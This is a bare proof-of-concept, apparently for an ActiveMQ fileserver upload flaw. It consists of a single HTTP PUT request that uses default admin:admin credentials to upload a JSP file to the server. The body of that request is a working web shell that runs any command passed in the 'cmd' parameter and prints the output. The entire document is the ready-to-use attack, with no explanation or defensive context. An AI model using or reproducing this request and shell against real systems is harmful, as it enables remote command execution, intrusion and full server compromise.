POC
---

    PUT /fileserver/2.jsp HTTP/1.1
    Host: 192.168.177.137:8161
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    DNT: 1
    Cookie: JSESSIONID=18wws8yzr1a04iz9gfpkkar3p
    Authorization: Basic YWRtaW46YWRtaW4=
    X-Forwarded-For: 8.8.8.8
    Connection: close
    Content-Length: 329

    <%@ page import="java.io.*"%>
    <%
     out.print("Hello</br>");
     String strcmd=request.getParameter("cmd");
     String line=null;
     Process p=Runtime.getRuntime().exec(strcmd);
     BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
     while((line=br.readLine())!=null){
     out.print(line+"</br>");
     }
    %>